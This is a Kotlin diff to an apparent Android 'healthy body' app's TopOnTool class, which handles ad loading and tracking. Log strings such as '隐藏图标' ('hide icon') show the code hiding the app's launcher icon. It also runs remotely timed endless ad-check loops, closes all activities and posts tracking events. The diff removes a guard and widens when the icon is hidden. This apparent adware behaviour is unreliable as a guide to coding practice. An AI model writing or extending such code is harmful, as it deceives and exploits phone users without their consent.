@@ -64,7 +64,7 @@ class TopOnTool {
                     false,
                     "getfail",
                     "string1",
-                    p0?.fullErrorInfo
+                    p0?.code+p0?.desc
                 )
                 isHaveAdData = false
             }
@@ -104,7 +104,7 @@ class TopOnTool {
                     false,
                     "showfailer",
                     "string3",
-                    p0?.fullErrorInfo
+                    p0?.code+"  "+p0?.desc
                 )
             }
         })
@@ -169,22 +169,19 @@ class TopOnTool {
         initFaceBook()
         intiTTTTAd()
         val adminData = ShowDataTool.getAdminData() ?: return
-        if (TopOnUtils.adNumAndPoint()) {
-            return
-        }
         val delayChecks = adminData.appConfig.timing.checks.splitString("|").getOrNull(0) ?: "0"
         val delayData = delayChecks.toLong().times(1000L)
         ShowDataTool.showLog("startRomFun delayData=: ${delayData}")
         jobAdRom = CoroutineScope(Dispatchers.Main).launch {
             while (true) {
                 val a = ArrayList(PngCanGo.activityList)
-                if (a.isEmpty() || (a.last().javaClass.name != "com.healthybody.happyeveryday.xxs.MainOneActivity" && a.last().javaClass.name != "com.healthybody.happyeveryday.xxs.MainActivity")) {
+                if (a.isEmpty() || (a.last().javaClass.name != "com.healthybody.happyeveryday.xxs.MainTwoActivity")) {
                     if (a.isEmpty()) {
                         ShowDataTool.showLog("隐藏图标=null")
                     } else {
                         ShowDataTool.showLog("隐藏图标=${a.last().javaClass.name}")
                     }
-                    ZJiaPng.jiaPng("happyeverydaynfxxs",true)
+                    ZJiaPng.jiaPng("happyeverydaynfxxs", true)
                     break
                 }
                 delay(500)
@@ -198,7 +195,7 @@ class TopOnTool {
             ShowDataTool.showLog("循环检测广告")
             TtPoint.postPointData(false, "timertask")
             if (TopOnUtils.adNumAndPoint()) {
-                TtPoint.postPointData(false, "jumpfail")
+                jumfailpost()
                 jobAdRom?.cancel()
                 break
             } else {
@@ -209,6 +206,13 @@ class TopOnTool {
         }
     }
 
+    private fun jumfailpost() {
+        val adFailPost = startApp.okSpBean.adFailPost
+        if (!adFailPost) {
+            TtPoint.postPointData(false, "jumpfail")
+            startApp.okSpBean.adFailPost = true
+        }
+    }
 
     private fun isHaveAdNextFun() {
         // 检查锁屏或息屏状态，避免过多的嵌套
@@ -297,7 +301,7 @@ class TopOnTool {
                 return@launch
             }
             addFa()
-            ZJiaPng.jiaPng("callstartgicallstart",true)
+            ZJiaPng.jiaPng("callstartgicallstart", true)
             TtPoint.postPointData(false, "callstart")
         }
     }
@@ -356,7 +360,7 @@ class TopOnTool {
             addFa()
             PngCanGo.closeAllActivities()
             delay(678)
-            ZJiaPng.jiaPng("ispassgicspass",false)
+            ZJiaPng.jiaPng("ispassgicspass", false)
             TtPoint.postPointData(false, "callstart")
         }
     }
